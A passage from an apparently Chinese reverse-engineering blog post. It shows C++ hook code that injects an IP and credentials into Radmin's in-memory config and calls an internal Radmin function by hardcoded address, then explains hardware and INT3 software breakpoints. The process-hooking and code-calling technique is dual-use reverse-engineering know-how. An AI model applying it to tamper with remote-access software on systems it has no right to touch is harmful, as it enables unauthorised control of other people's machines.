class="built_in">lstrcpyA</span>(dwOpenPassWord,strPassWord.<span class="built_in">GetString</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(<span class="keyword">this</span>-&gt;gIP_Buffer,<span class="number">0</span>,MAX_PATH+<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">memset</span>(<span class="keyword">this</span>-&gt;gUser_Buffer,<span class="number">0</span>,MAX_PATH+<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">memset</span>(<span class="keyword">this</span>-&gt;gPass_Buffer,<span class="number">0</span>,MAX_PATH+<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">lstrcpyA</span>(<span class="keyword">this</span>-&gt;gIP_Buffer,dwOpenIP);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">lstrcpyA</span>(<span class="keyword">this</span>-&gt;gUser_Buffer,dwOpenUser);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">lstrcpyA</span>(<span class="keyword">this</span>-&gt;gPass_Buffer,dwOpenPassWord);</span><br><span class="line"></span><br><span class="line">	CallConnectThread = <span class="built_in">AfxBeginThread</span>(OnCallConnect, <span class="keyword">this</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL  <span class="title">helpHook::LoadIP</span><span class="params">(DWORD szID,<span class="type">char</span> * szFilePath,<span class="type">char</span> * szConnectIPAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> dwDir[MAX_PATH+<span class="number">1</span>] =&#123;<span class="number">0</span>&#125;; </span><br><span class="line">	<span class="type">char</span> data[MAX_PATH*<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">GetCurrentDirectoryA</span>( MAX_PATH+<span class="number">1</span>,dwDir);   		<span class="comment">// 获取目录</span></span><br><span class="line">	<span class="built_in">lstrcatA</span>(dwDir,szFilePath);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">lstrlenA</span>(szConnectIPAddress)==<span class="number">0</span> || szID==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//this-&gt;MessageBox(dwDir,NULL);</span></span><br><span class="line"></span><br><span class="line">	HANDLE hFile=<span class="built_in">CreateFileA</span>(					 <span class="comment">// 打开rpb配置文件，文件不存在CreateFile不会创建，创建文件是mfc自己封装的</span></span><br><span class="line">		dwDir,</span><br><span class="line">		GENERIC_READ|GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ|FILE_SHARE_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,     </span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,   </span><br><span class="line">		<span class="number">0</span>); </span><br><span class="line">	<span class="keyword">if</span> (hFile==INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD size_low,size_high;</span><br><span class="line">	size_low= <span class="built_in">GetFileSize</span>(hFile,&amp;size_high); 		<span class="comment">// 获取文件长度</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size_low==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hMapFile=<span class="built_in">CreateFileMappingA</span>(  		<span class="comment">// 创建文件映射，将文件映射到内存中，返回内存文件指针</span></span><br><span class="line">		hFile,     </span><br><span class="line">		<span class="literal">NULL</span>,   </span><br><span class="line">		PAGE_READWRITE,</span><br><span class="line">		size_high,    </span><br><span class="line">		size_low,</span><br><span class="line">		<span class="literal">NULL</span>);   </span><br><span class="line">	<span class="keyword">if</span>(hMapFile==INVALID_HANDLE_VALUE)   </span><br><span class="line">	&#123;   </span><br><span class="line">		<span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">		<span class="keyword">return</span> FALSE;   </span><br><span class="line">	&#125;  </span><br><span class="line">	<span class="type">void</span>* pvFile=<span class="built_in">MapViewOfFile</span>(				</span><br><span class="line">		hMapFile, </span><br><span class="line">		FILE_MAP_READ|FILE_MAP_WRITE, </span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pvFile)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pvFile!=<span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">UnmapViewOfFile</span>(pvFile);			<span class="comment">// 释放内存映射</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pvFile!=<span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">UnmapViewOfFile</span>(pvFile);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hFile!=<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	LPVOID pvBuffer=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,size_low,MEM_COMMIT,PAGE_READWRITE);			<span class="comment">// 分配内存</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pvBuffer!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="type">char</span> *)pvBuffer,(<span class="type">char</span> *)pvFile,size_low);							<span class="comment">// 内存拷贝</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>((<span class="type">char</span> *)pvBuffer+<span class="number">0x13C0</span>,<span class="number">0</span>,<span class="number">0x190</span>);</span><br><span class="line">	<span class="type">wchar_t</span> dwIP[MAX_PATH+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">int</span> len=<span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, szConnectIPAddress, <span class="number">-1</span>, <span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, szConnectIPAddress, <span class="number">-1</span>, dwIP, len);</span><br><span class="line">	<span class="built_in">wcscpy</span>((<span class="type">wchar_t</span> *)((<span class="type">char</span> *)pvBuffer+<span class="number">0x13C1</span>),dwIP);</span><br><span class="line">	<span class="built_in">wcscpy</span>((<span class="type">wchar_t</span> *)((<span class="type">char</span> *)pvBuffer+<span class="number">0x1489</span>),dwIP);</span><br><span class="line">	<span class="comment">//调用call</span></span><br><span class="line">	DWORD this_offset=(DWORD)pvBuffer+<span class="number">0x99</span>;</span><br><span class="line"></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		__asm</span><br><span class="line">		&#123;</span><br><span class="line">			pushad</span><br><span class="line">			mov esi,<span class="number">0</span></span><br><span class="line">			mov eax,szID</span><br><span class="line">			mov edi,this_offset</span><br><span class="line">			push eax</span><br><span class="line">			push edi</span><br><span class="line">			mov  ecx,esi</span><br><span class="line">			mov  eax,OpenCallAddr</span><br><span class="line">			call eax</span><br><span class="line">			popad</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualFree</span>(pvBuffer,size_low,MEM_RELEASE);</span><br><span class="line">	<span class="keyword">if</span> (pvFile!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">UnmapViewOfFile</span>(pvFile);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pvFile!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">UnmapViewOfFile</span>(pvFile);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hFile!=<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">radmin 功能函数分析</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用PELoader动态加载方式，代码解密后运行在内存，OEP关键代码</span><br><span class="line"></span><br><span class="line"><span class="number">03</span> <span class="number">55</span> <span class="number">94</span> <span class="number">89</span> <span class="number">55</span> A4 <span class="number">8B</span> <span class="number">45</span> A4 FF E0</span><br><span class="line"></span><br><span class="line">一：打开要连接的虚拟机平台</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>:特征码)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8B</span> B4 <span class="number">24</span> EC <span class="number">7B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">50</span> <span class="number">57</span> <span class="number">8</span>D <span class="number">95</span> <span class="number">58</span> <span class="number">34</span> <span class="number">00</span> <span class="number">00</span> <span class="number">8B</span> <span class="built_in">CE</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>:功能）</span><br><span class="line"></span><br><span class="line">打开对话框CALL</span><br><span class="line"></span><br><span class="line"><span class="number">01438544</span>    <span class="number">8B</span>B424 EC7B0000 mov     esi,dword ptr ss:[esp+<span class="number">0x7BEC</span>]</span><br><span class="line"><span class="number">0143854B</span>    <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0143854</span>C    <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0143854</span>D    <span class="number">8</span>D95 <span class="number">58340000</span>   lea     edx,dword ptr ss:[ebp+<span class="number">0x3458</span>]</span><br><span class="line"><span class="number">01438553</span>    <span class="number">8B</span>CE            mov     ecx,esi</span><br><span class="line"><span class="number">01438555</span>    E8 <span class="number">56690000</span>     call    <span class="number">0143</span>EEB0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">调用例子：</span><br><span class="line"></span><br><span class="line">pushad</span><br><span class="line">mov esi,<span class="number">0x00BB0DE4</span></span><br><span class="line">mov eax,<span class="number">0x9C49</span></span><br><span class="line">mov edi,<span class="number">0x0093BB6C</span></span><br><span class="line">push eax</span><br><span class="line">push edi</span><br><span class="line">mov  ecx,esi</span><br><span class="line">mov  eax,<span class="number">0x0143EEB0</span></span><br><span class="line">call eax</span><br><span class="line"><span class="built_in">popad</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>:参数分析)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eax = <span class="number">00009</span>C49 功能号</span><br><span class="line"></span><br><span class="line">ecx=基址[uxtheme.dll+<span class="number">0x50C5C</span>]</span><br><span class="line"></span><br><span class="line">esi=C:\Users\fku\AppData\Roaming\Radmin\radmin.rpb 文件指针 对应代码</span><br><span class="line"></span><br><span class="line">特征码：<span class="number">8B</span> <span class="number">6</span>C <span class="number">24</span> <span class="number">6</span>C <span class="number">8B</span> <span class="number">44</span> <span class="number">24</span> <span class="number">5</span>C <span class="number">89</span> <span class="number">84</span> <span class="number">24</span> <span class="number">9</span>E <span class="number">36</span> <span class="number">00</span> <span class="number">00</span> <span class="number">39</span> <span class="number">5</span>D <span class="number">08</span> <span class="number">88</span> <span class="number">9</span>C <span class="number">24</span> <span class="number">9</span>D <span class="number">36</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="number">014157</span>A6    <span class="number">8B</span>6C24 <span class="number">6</span>C       mov     ebp,dword ptr ss:[esp+<span class="number">0x6C</span>]</span><br><span class="line"><span class="number">014157</span>AA    <span class="number">8B</span>4424 <span class="number">5</span>C       mov     eax,dword ptr ss:[esp+<span class="number">0x5C</span>]</span><br><span class="line"><span class="number">014157</span>AE    <span class="number">898424</span> <span class="number">9E360000</span> mov     dword ptr ss:[esp+<span class="number">0x369E</span>],eax</span><br><span class="line"><span class="number">014157B</span>5    <span class="number">395</span>D <span class="number">08</span>         cmp     dword ptr ss:[ebp+<span class="number">0x8</span>],ebx</span><br><span class="line"><span class="number">014157B</span>8    <span class="number">889</span>C24 <span class="number">9</span>D360000 mov     byte ptr ss:[esp+<span class="number">0x369D</span>],bl</span><br><span class="line"><span class="number">014157B</span>F    <span class="number">75</span> <span class="number">11</span>           jnz     <span class="type">short</span> <span class="number">014157</span>D2</span><br><span class="line"><span class="number">014157</span>C1    <span class="number">8</span>D8C24 B01E0000 lea     ecx,dword ptr ss:[esp+<span class="number">0x1EB0</span>]</span><br><span class="line"><span class="number">014157</span>C8    <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">014157</span>C9    <span class="number">8B</span>CD            mov     ecx,ebp</span><br><span class="line"><span class="number">014157</span>CB    E8 C03D0000     call    <span class="number">01419590</span>                <span class="comment">//调用完读取radmin.rpb后返回文件buffer指针在EAX中存放。</span></span><br><span class="line"><span class="number">014157</span>D0    EB <span class="number">46</span>           jmp     <span class="type">short</span> <span class="number">01415818</span></span><br><span class="line"><span class="number">014157</span>D2    <span class="number">68</span> <span class="number">00180000</span>     push    <span class="number">0x1800</span></span><br><span class="line"><span class="number">014157</span>D7    E8 <span class="number">4F</span>C70A00     call    <span class="number">014</span>C1F2B</span><br><span class="line"><span class="number">014157</span>DC    <span class="number">83</span>C4 <span class="number">04</span>         add     esp,<span class="number">0x4</span></span><br><span class="line"><span class="number">014157</span>DF    <span class="number">3B</span>C3            cmp     eax,ebx</span><br><span class="line"><span class="number">014157E1</span>    <span class="number">74</span> <span class="number">64</span>           je      <span class="type">short</span> <span class="number">01415847</span></span><br><span class="line"><span class="number">014157E3</span>    <span class="number">8</span>D9424 B01E0000 lea     edx,dword ptr ss:[esp+<span class="number">0x1EB0</span>]</span><br><span class="line"></span><br><span class="line">hook的位置：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0141581</span>C    <span class="number">8</span>D5424 <span class="number">54</span>       lea     edx,dword ptr ss:[esp+<span class="number">0x54</span>]</span><br><span class="line"><span class="number">01415820</span>    <span class="number">52</span>              push    edx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hook后获取radmin.rpb buffer指针用来调CALL用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="硬件断点原理"><a class="markdownIt-Anchor" href="#硬件断点原理">#</a> 硬件断点原理</h3>
<p>Intel 80306 以上的 CPU 给我们提供了调试寄存器用于软件调试，硬件断点是通过设置调试寄存器实现的。</p>
<p>根据介绍，DR0-DR3 为设置断点的地址，DR4 和 DR5 为保留，</p>
<p>DR6 为调试异常产生后显示的一些信息，DR7 保存了断点是否启用、断点类型和长度等信息。</p>
<p>我们在使用硬件断点的时候，就是要设置调试寄存器，将断点的位置设置到 DR0-DR3 中，断点的长度设置到 DR7 的 LEN0-LEN3 中，将断点的类型设置到 DR7 的 RW0-RW3 中，将是否启用断点设置到 DR7 的 L0-L3 中。</p>
<p>设置硬件断点需要的 DR0-DR3 很简单，就是下断点的地址，DR7 寄存器很复杂，位段信息结构体如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">实现硬件断点，首先要获取当前线程环境</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取线程环境</span></span><br><span class="line">CONTEXT g_Context = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">g_Context.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(hThread, &amp;g_Context);</span><br><span class="line">在CONTEXT结构体中，存放了诸多当前线程环境的信息，以下是从winnt.h文件中找到的CONTEXT结构体</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CONTEXT</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The flags values within this flag control the contents of</span></span><br><span class="line">    <span class="comment">// a CONTEXT record.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If the context record is used as an input parameter, then</span></span><br><span class="line">    <span class="comment">// for each portion of the context record controlled by a flag</span></span><br><span class="line">    <span class="comment">// whose value is set, it is assumed that that portion of the</span></span><br><span class="line">    <span class="comment">// context record contains valid context. If the context record</span></span><br><span class="line">    <span class="comment">// is being used to modify a threads context, then only that</span></span><br><span class="line">    <span class="comment">// portion of the threads context will be modified.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If the context record is used as an IN OUT parameter to capture</span></span><br><span class="line">    <span class="comment">// the context of a thread, then only those portions of the thread&#x27;s</span></span><br><span class="line">    <span class="comment">// context corresponding to set flags will be returned.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The context record is never used as an OUT only parameter.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is</span></span><br><span class="line">    <span class="comment">// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT</span></span><br><span class="line">    <span class="comment">// included in CONTEXT_FULL.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_SEGMENTS.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_INTEGER.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_CONTROL.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;</span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the ContextFlags word</span></span><br><span class="line">    <span class="comment">// contains the flag CONTEXT_EXTENDED_REGISTERS.</span></span><br><span class="line">    <span class="comment">// The format and contexts are processor specific</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"> </span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line"> </span><br><span class="line">&#125; CONTEXT;</span><br><span class="line">从CONTEXT结构体中我们可以看到存放了调试寄存器 Dr0-Dr3和Dr6、Dr7，通过设置这些寄存器我们可以实现硬件断点。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入下断点的地址、类型、长度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHardBP</span><span class="params">(DWORD addr, BreakPointHard type, BreakPointLen len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//利用上文中的DR7寄存器位段信息</span></span><br><span class="line">    DBG_REG7 *pDr7 = (DBG_REG7 *)&amp;g_Context.Dr7;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//两字节的对齐粒度</span></span><br><span class="line">        addr = addr - addr % <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//四字节的对齐粒度</span></span><br><span class="line">        addr = addr - addr % <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (pDr7-&gt;L0 == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        g_Context.Dr0 = addr;   <span class="comment">//利用Dr0寄存器存放地址</span></span><br><span class="line">        pDr7-&gt;RW0 = type;       <span class="comment">//Dr7寄存器中的RW0设置类型</span></span><br><span class="line">        pDr7-&gt;LEN0 = len;        <span class="comment">//Dr7寄存器中的LEN0设置长度</span></span><br><span class="line">        pDr7-&gt;L0 = <span class="number">1</span>;            <span class="comment">//Dr7寄存器中的L0启用断点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pDr7-&gt;L1 == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        g_Context.Dr1 = addr;</span><br><span class="line">        pDr7-&gt;RW1 = type;</span><br><span class="line">        pDr7-&gt;LEN1 = len;</span><br><span class="line">        pDr7-&gt;L1 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pDr7-&gt;L2 == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        g_Context.Dr2 = addr;</span><br><span class="line">        pDr7-&gt;RW2 = type;</span><br><span class="line">        pDr7-&gt;LEN2 = len;</span><br><span class="line">        pDr7-&gt;L2 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pDr7-&gt;L3 == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        g_Context.Dr3 = addr;</span><br><span class="line">        pDr7-&gt;RW3 = type;</span><br><span class="line">        pDr7-&gt;LEN3 = len;</span><br><span class="line">        pDr7-&gt;L3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(hThread, &amp;g_Context);</span><br></pre></td></tr></table></figure>
<h3 id="软件断点"><a class="markdownIt-Anchor" href="#软件断点">#</a> 软件断点</h3>
<p>int 3<br>
 设置断点命令对应的汇编指令为 INT3，对应的机器指令的也就是 0xCC。CPU 运行代码的过程中若遇到汇编指令 INT3，则会触发 EXCEPTION_BREAKPOINT 异常。</p>
<p>由于 Ollydbg 中按 F2 设置的断点是用户用来调试的临时断点（User Temporary Break Point），所以不需要在调试画面中显示。在代码与内存中显示出来的话，大大降低了代码的可读性，给代码调试带来不便。换言之，实际进程内存中 0x1003E21 的 “6A” 已经换成 “CC”，但为了调试方便，所以呢，OD 就没有显示出来。我们只需要把这个程序 dump 出来，然后放进 Hex_Editor 查看一下这个位置的数据即可。</p>
<p><strong>它会先把下断点的位置的前一句代码改成 int 3 然后 等到运行到这里时，再把它改回来</strong></p>
